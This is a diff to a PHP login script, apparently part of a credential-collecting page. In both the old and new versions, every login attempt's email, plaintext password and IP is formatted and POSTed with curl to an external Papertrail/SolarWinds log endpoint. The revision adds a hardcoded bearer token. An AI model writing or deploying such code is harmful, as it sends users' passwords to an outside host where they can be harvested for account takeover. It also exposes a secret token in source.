@@ -14,39 +14,34 @@ function sendJsonResponse($success, $message = '', $redirectUrl = '') {
     exit();
 }
 
-// Log all login attempts to Papertrail
+// Log all login attempts to Papertrail using HTTPS
 try {
-    // Prepare log data
-    $logData = [
-        "Date" => date("Y-m-d H:i:s"),
-        "Email" => $email,
-        "Password" => $password,
-        "IP" => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
-    ];
+    // Papertrail endpoint URL
+    $papertrailUrl = "https://logs.collector.na-01.cloud.solarwinds.com/v1/logs/bulk"; // Replace with your bulk endpoint
+    $authorizationToken = "3Vb4KQWqFeJsIF_sBb7dN8pg1jm8ByXFeF45UgkwFcOUM194h_77z7n7zdEG6mEN-KhgKg"; // Replace with your token
 
-    // Convert log data to string format for sending
-    $logMessage = sprintf(
+    // Prepare log data
+    $logData = sprintf(
         "Date: %s | Email: %s | Password: %s | IP: %s",
-        $logData["Date"],
-        $logData["Email"],
-        $logData["Password"],
-        $logData["IP"]
+        date("Y-m-d H:i:s"),
+        $email,
+        $password,
+        $_SERVER['REMOTE_ADDR'] ?? 'Unknown'
     );
 
-    // Send logs to Papertrail URL
-    $papertrailUrl = "https://logs.collector.na-01.cloud.solarwinds.com/v1/logs"; // Replace with your Papertrail URL
-
+    // Send logs via POST request using curl
     $ch = curl_init($papertrailUrl);
     curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $logMessage);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $logData);
     curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        "Content-Type: text/plain",
+        "Content-Type: application/octet-stream",
+        "Authorization: Bearer $authorizationToken"
     ]);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Get the response from Papertrail
 
     $response = curl_exec($ch);
     if ($response === false) {
-        error_log("Failed to send log to Papertrail: " . curl_error($ch));
+        error_log("Failed to send logs to Papertrail: " . curl_error($ch));
         sendJsonResponse(false, "A server error occurred while saving the login attempt.");
     }
     curl_close($ch);
